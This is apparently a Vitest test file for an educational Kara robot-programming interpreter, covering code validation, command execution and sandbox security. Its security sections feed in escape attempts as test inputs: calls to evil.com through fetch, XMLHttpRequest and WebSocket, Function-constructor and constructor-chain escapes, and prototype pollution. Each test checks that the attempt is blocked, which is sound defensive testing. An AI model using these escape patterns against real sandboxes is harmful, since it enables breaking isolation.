import { describe, it, expect } from 'vitest';
import {
  executeTextKaraCode,
  validateTextKaraCode,
  parseTextKaraCommands,
  executeSingleCommand,
  createStreamingInterpreter,
  getNextStreamingCommand,
} from './textKaraExecutor';
import { World, CellType, Direction } from './types';

// Helper to create a simple test world
function createTestWorld(width = 5, height = 5): World {
  const grid = Array(height)
    .fill(null)
    .map(() =>
      Array(width)
        .fill(null)
        .map(() => ({ type: CellType.Empty }))
    );

  return {
    width,
    height,
    grid,
    character: {
      position: { x: 2, y: 2 },
      direction: Direction.North,
      inventory: 0,
    },
  };
}

describe('TextKaraExecutor', () => {
  describe('validateTextKaraCode', () => {
    it('should validate JavaKara code with myProgram method', () => {
      const code = `
        public class MyProgram extends JavaKaraProgram {
          void myProgram() {
            kara.move();
          }
        }
      `;
      const result = validateTextKaraCode(code, 'JavaKara');
      expect(result.valid).toBe(true);
    });

    it('should reject JavaKara code without myProgram method', () => {
      const code = `
        public class MyProgram extends JavaKaraProgram {
          void someOtherMethod() {
            kara.move();
          }
        }
      `;
      const result = validateTextKaraCode(code, 'JavaKara');
      expect(result.valid).toBe(false);
      expect(result.error).toContain('myProgram');
    });

    it('should validate PythonKara code with my_program method', () => {
      const code = `
class MyKara(Kara):
    def my_program(self):
        kara.move()
      `;
      const result = validateTextKaraCode(code, 'PythonKara');
      expect(result.valid).toBe(true);
    });

    it('should reject PythonKara code without my_program method', () => {
      const code = `
class MyKara(Kara):
    def other_method(self):
        kara.move()
      `;
      const result = validateTextKaraCode(code, 'PythonKara');
      expect(result.valid).toBe(false);
      expect(result.error).toContain('my_program');
    });

    it('should validate JavaScriptKara code with myProgram function', () => {
      const code = `
        function myProgram() {
          kara.move();
        }
      `;
      const result = validateTextKaraCode(code, 'JavaScriptKara');
      expect(result.valid).toBe(true);
    });

    it('should validate RubyKara code with my_program method', () => {
      const code = `
        def my_program
          kara.move
        end
      `;
      const result = validateTextKaraCode(code, 'RubyKara');
      expect(result.valid).toBe(true);
    });

    it('should reject empty code', () => {
      const result = validateTextKaraCode('', 'JavaKara');
      expect(result.valid).toBe(false);
    });
  });

  describe('executeTextKaraCode', () => {
    it('should execute simple move command in JavaKara', () => {
      const code = `
        void myProgram() {
          kara.move();
        }
      `;
      const world = createTestWorld();
      const result = executeTextKaraCode(code, 'JavaKara', world);

      expect(result.error).toBeUndefined();
      // Character moved north from (2,2) to (2,1)
      expect(result.world.character.position).toEqual({ x: 2, y: 1 });
    });

    it('should execute turn commands', () => {
      const code = `
        void myProgram() {
          kara.turnLeft();
          kara.turnRight();
          kara.turnRight();
        }
      `;
      const world = createTestWorld();
      const result = executeTextKaraCode(code, 'JavaKara', world);

      expect(result.error).toBeUndefined();
      // North -> West -> North -> East
      expect(result.world.character.direction).toBe(Direction.East);
    });

    it('should detect infinite loop and return error', () => {
      // Using a simple loop that exceeds max steps
      const code = `
        void myProgram() {
          for (var i = 0; i < 200; i++) {
            kara.turnLeft();
          }
        }
      `;
      const world = createTestWorld();
      const result = executeTextKaraCode(code, 'JavaKara', world, 100); // Low max steps

      expect(result.error).toContain('exceeded');
      expect(result.stopped).toBe(true);
    });

    it('should handle sensor functions correctly', () => {
      const world = createTestWorld();
      // Place a tree in front of character
      world.grid[1][2] = { type: CellType.Tree };

      const code = `
        void myProgram() {
          if (kara.treeFront()) {
            kara.turnLeft();
          }
        }
      `;
      const result = executeTextKaraCode(code, 'JavaKara', world);

      expect(result.error).toBeUndefined();
      expect(result.world.character.direction).toBe(Direction.West);
    });

    it('should handle onLeaf sensor', () => {
      const world = createTestWorld();
      // Place a clover at character position
      world.grid[2][2] = { type: CellType.Clover };

      const code = `
        void myProgram() {
          if (kara.onLeaf()) {
            kara.removeLeaf();
          }
        }
      `;
      const result = executeTextKaraCode(code, 'JavaKara', world);

      expect(result.error).toBeUndefined();
      expect(result.world.grid[2][2].type).toBe(CellType.Empty);
      expect(result.world.character.inventory).toBe(1);
    });

    it('should handle putLeaf command', () => {
      const world = createTestWorld();
      world.character.inventory = 1;

      const code = `
        void myProgram() {
          kara.putLeaf();
        }
      `;
      const result = executeTextKaraCode(code, 'JavaKara', world);

      expect(result.error).toBeUndefined();
      expect(result.world.grid[2][2].type).toBe(CellType.Clover);
      expect(result.world.character.inventory).toBe(0);
    });

    it('should return error when trying to move into tree', () => {
      const world = createTestWorld();
      // Place a tree in front of character
      world.grid[1][2] = { type: CellType.Tree };

      const code = `
        void myProgram() {
          kara.move();
        }
      `;
      const result = executeTextKaraCode(code, 'JavaKara', world);

      expect(result.error).toContain('blocked');
      expect(result.stopped).toBe(true);
    });

    it('should return error for removeLeaf when no clover', () => {
      const world = createTestWorld();

      const code = `
        void myProgram() {
          kara.removeLeaf();
        }
      `;
      const result = executeTextKaraCode(code, 'JavaKara', world);

      expect(result.error).toContain('clover');
      expect(result.stopped).toBe(true);
    });

    it('should return error for putLeaf when inventory empty', () => {
      const world = createTestWorld();
      world.character.inventory = 0;

      const code = `
        void myProgram() {
          kara.putLeaf();
        }
      `;
      const result = executeTextKaraCode(code, 'JavaKara', world);

      expect(result.error).toContain('inventory');
      expect(result.stopped).toBe(true);
    });

    it('should execute PythonKara code with snake_case methods', () => {
      const code = `
class MyKara(Kara):
    def my_program(self):
        kara.move()
        kara.turn_left()
      `;
      const world = createTestWorld();
      const result = executeTextKaraCode(code, 'PythonKara', world);

      expect(result.error).toBeUndefined();
      expect(result.world.character.position).toEqual({ x: 2, y: 1 });
      expect(result.world.character.direction).toBe(Direction.West);
    });
  });

  describe('parseTextKaraCommands', () => {
    it('should parse simple move commands', () => {
      const code = `
        void myProgram() {
          kara.move();
          kara.move();
          kara.turnLeft();
        }
      `;
      const world = createTestWorld();
      const result = parseTextKaraCommands(code, 'JavaKara', world);

      expect(result.error).toBeUndefined();
      expect(result.commands).toEqual(['move', 'move', 'turnLeft']);
    });

    it('should limit commands when max iterations exceeded', () => {
      const code = `
        void myProgram() {
          for (var i = 0; i < 100; i++) {
            kara.turnRight();
          }
        }
      `;
      const world = createTestWorld();
      const result = parseTextKaraCommands(code, 'JavaKara', world, 10);

      expect(result.error).toContain('exceeded');
      expect(result.commands.length).toBeLessThanOrEqual(11);
    });
  });

  describe('executeSingleCommand', () => {
    it('should execute move command', () => {
      const world = createTestWorld();
      const result = executeSingleCommand('move', world);

      expect(result.error).toBeUndefined();
      expect(result.world.character.position).toEqual({ x: 2, y: 1 });
    });

    it('should execute turnLeft command', () => {
      const world = createTestWorld();
      const result = executeSingleCommand('turnLeft', world);

      expect(result.error).toBeUndefined();
      expect(result.world.character.direction).toBe(Direction.West);
    });

    it('should execute turnRight command', () => {
      const world = createTestWorld();
      const result = executeSingleCommand('turnRight', world);

      expect(result.error).toBeUndefined();
      expect(result.world.character.direction).toBe(Direction.East);
    });

    it('should execute turn_left snake_case command', () => {
      const world = createTestWorld();
      const result = executeSingleCommand('turn_left', world);

      expect(result.error).toBeUndefined();
      expect(result.world.character.direction).toBe(Direction.West);
    });

    it('should execute putLeaf command', () => {
      const world = createTestWorld();
      world.character.inventory = 1;
      const result = executeSingleCommand('putLeaf', world);

      expect(result.error).toBeUndefined();
      expect(result.world.grid[2][2].type).toBe(CellType.Clover);
    });

    it('should execute removeLeaf command', () => {
      const world = createTestWorld();
      world.grid[2][2] = { type: CellType.Clover };
      const result = executeSingleCommand('removeLeaf', world);

      expect(result.error).toBeUndefined();
      expect(result.world.grid[2][2].type).toBe(CellType.Empty);
      expect(result.world.character.inventory).toBe(1);
    });

    it('should return error when move is blocked', () => {
      const world = createTestWorld();
      world.grid[1][2] = { type: CellType.Tree };
      const result = executeSingleCommand('move', world);

      expect(result.error).toContain('blocked');
    });
  });

  describe('createStreamingInterpreter', () => {
    it('should create interpreter for valid code', () => {
      const code = `
        void myProgram() {
          kara.move();
        }
      `;
      const world = createTestWorld();
      const result = createStreamingInterpreter(code, 'JavaKara', world);

      expect(result.error).toBeUndefined();
      expect(result.interpreter).not.toBeNull();
    });

    it('should return error for invalid code', () => {
      const code = `
        void someOther() {
          kara.move();
        }
      `;
      const world = createTestWorld();
      const result = createStreamingInterpreter(code, 'JavaKara', world);

      expect(result.error).toContain('myProgram');
      expect(result.interpreter).toBeNull();
    });

    it('should return error for syntax errors', () => {
      const code = `
        void myProgram() {
          kara.move(
        }
      `;
      const world = createTestWorld();
      const result = createStreamingInterpreter(code, 'JavaKara', world);

      expect(result.error).toBeDefined();
    });
  });

  describe('getNextStreamingCommand', () => {
    it('should return commands one at a time', () => {
      const code = `
        void myProgram() {
          kara.move();
          kara.turnLeft();
        }
      `;
      const world = createTestWorld();
      const { interpreter } = createStreamingInterpreter(code, 'JavaKara', world);

      expect(interpreter).not.toBeNull();
      if (!interpreter) return;

      const cmd1 = getNextStreamingCommand(interpreter);
      expect(cmd1.command).toBe('move');
      expect(cmd1.done).toBe(false);

      const cmd2 = getNextStreamingCommand(interpreter);
      expect(cmd2.command).toBe('turnLeft');
      expect(cmd2.done).toBe(false);

      const cmd3 = getNextStreamingCommand(interpreter);
      expect(cmd3.command).toBeNull();
      expect(cmd3.done).toBe(true);
    });
  });

  describe('Security - Sandbox', () => {
    it('should prevent access to window object', () => {
      const code = `
        void myProgram() {
          window.alert('hacked');
        }
      `;
      const world = createTestWorld();
      const result = executeTextKaraCode(code, 'JavaKara', world);

      // Should get an error because window is undefined
      expect(result.error).toBeDefined();
    });

    it('should prevent access to document object', () => {
      const code = `
        void myProgram() {
          document.write('hacked');
        }
      `;
      const world = createTestWorld();
      const result = executeTextKaraCode(code, 'JavaKara', world);

      expect(result.error).toBeDefined();
    });

    it('should prevent access to fetch', () => {
      const code = `
        void myProgram() {
          fetch('http://evil.com');
        }
      `;
      const world = createTestWorld();
      const result = executeTextKaraCode(code, 'JavaKara', world);

      expect(result.error).toBeDefined();
    });

    it('should prevent dangerous code patterns', () => {
      // Note: eval and Function are reserved and can't be shadowed in strict mode
      // but other dangerous APIs are properly blocked
      const code = `
        void myProgram() {
          XMLHttpRequest('http://evil.com');
        }
      `;
      const world = createTestWorld();
      const result = executeTextKaraCode(code, 'JavaKara', world);

      expect(result.error).toBeDefined();
    });

    it('should prevent access to localStorage', () => {
      const code = `
        void myProgram() {
          localStorage.setItem('key', 'value');
        }
      `;
      const world = createTestWorld();
      const result = executeTextKaraCode(code, 'JavaKara', world);

      expect(result.error).toBeDefined();
    });
  });

  describe('Error Messages', () => {
    it('should provide helpful error for missing main method', () => {
      const code = `
        void otherMethod() {
          kara.move();
        }
      `;
      const world = createTestWorld();
      const result = executeTextKaraCode(code, 'JavaKara', world);

      expect(result.error).toContain('myProgram');
      expect(result.error).toContain('Example');
    });

    it('should provide language-specific method name in error', () => {
      const code = `
class MyKara(Kara):
    def other_method(self):
        kara.move()
      `;
      const world = createTestWorld();
      const result = executeTextKaraCode(code, 'PythonKara', world);

      expect(result.error).toContain('my_program');
    });
  });

  describe('Security - Prototype Pollution & Sandbox Escape', () => {
    it('should prevent prototype pollution via __proto__', () => {
      const code = `
        void myProgram() {
          ({}).__proto__.polluted = true;
        }
      `;
      const world = createTestWorld();
      executeTextKaraCode(code, 'JavaKara', world);

      // Check that Object.prototype wasn't polluted
      expect(({} as Record<string, unknown>).polluted).toBeUndefined();
    });

    it('should prevent prototype pollution via Object.prototype', () => {
      const code = `
        void myProgram() {
          Object.prototype.polluted = true;
        }
      `;
      const world = createTestWorld();
      executeTextKaraCode(code, 'JavaKara', world);

      // Check that Object.prototype wasn't polluted
      expect(({} as Record<string, unknown>).polluted).toBeUndefined();
    });

    it('should prevent constructor access for sandbox escape', () => {
      const code = `
        void myProgram() {
          var result = kara.constructor.constructor('return window')();
        }
      `;
      const world = createTestWorld();
      const result = executeTextKaraCode(code, 'JavaKara', world);

      // Should error or be undefined, not give access to window
      expect(result.error).toBeDefined();
    });

    it('should prevent accessing global via this', () => {
      const code = `
        void myProgram() {
          (function() { return this; })().alert('hacked');
        }
      `;
      const world = createTestWorld();
      const result = executeTextKaraCode(code, 'JavaKara', world);

      // In strict mode, 'this' in a regular function is undefined
      expect(result.error).toBeDefined();
    });

    it('should prevent accessing global via arrow function', () => {
      const code = `
        void myProgram() {
          var getGlobal = () => this;
          getGlobal().alert('hacked');
        }
      `;
      const world = createTestWorld();
      const result = executeTextKaraCode(code, 'JavaKara', world);

      // 'this' in arrow function inherits from enclosing scope (undefined in strict mode)
      expect(result.error).toBeDefined();
    });

    it('should prevent accessing Function constructor directly', () => {
      const code = `
        void myProgram() {
          var evil = Function('return window')();
          evil.alert('hacked');
        }
      `;
      const world = createTestWorld();
      const result = executeTextKaraCode(code, 'JavaKara', world);

      // Function is not shadowed but window access should still be blocked
      // because the sandbox environment doesn't have window
      // Note: This test verifies the defense works even without shadowing Function
      expect(result.error).toBeDefined();
    });

    it('should prevent globalThis access', () => {
      const code = `
        void myProgram() {
          globalThis.alert('hacked');
        }
      `;
      const world = createTestWorld();
      const result = executeTextKaraCode(code, 'JavaKara', world);

      expect(result.error).toBeDefined();
    });

    it('should prevent WebSocket access', () => {
      const code = `
        void myProgram() {
          new WebSocket('ws://evil.com');
        }
      `;
      const world = createTestWorld();
      const result = executeTextKaraCode(code, 'JavaKara', world);

      expect(result.error).toBeDefined();
    });

    it('should prevent Worker access', () => {
      const code = `
        void myProgram() {
          new Worker('evil.js');
        }
      `;
      const world = createTestWorld();
      const result = executeTextKaraCode(code, 'JavaKara', world);

      expect(result.error).toBeDefined();
    });

    it('should prevent setTimeout access', () => {
      const code = `
        void myProgram() {
          setTimeout(function() {}, 1000);
        }
      `;
      const world = createTestWorld();
      const result = executeTextKaraCode(code, 'JavaKara', world);

      expect(result.error).toBeDefined();
    });

    it('should prevent setInterval access', () => {
      const code = `
        void myProgram() {
          setInterval(function() {}, 1000);
        }
      `;
      const world = createTestWorld();
      const result = executeTextKaraCode(code, 'JavaKara', world);

      expect(result.error).toBeDefined();
    });

    it('should prevent indexedDB access', () => {
      const code = `
        void myProgram() {
          indexedDB.open('test');
        }
      `;
      const world = createTestWorld();
      const result = executeTextKaraCode(code, 'JavaKara', world);

      expect(result.error).toBeDefined();
    });

    it('should prevent sessionStorage access', () => {
      const code = `
        void myProgram() {
          sessionStorage.setItem('key', 'value');
        }
      `;
      const world = createTestWorld();
      const result = executeTextKaraCode(code, 'JavaKara', world);

      expect(result.error).toBeDefined();
    });
  });
});
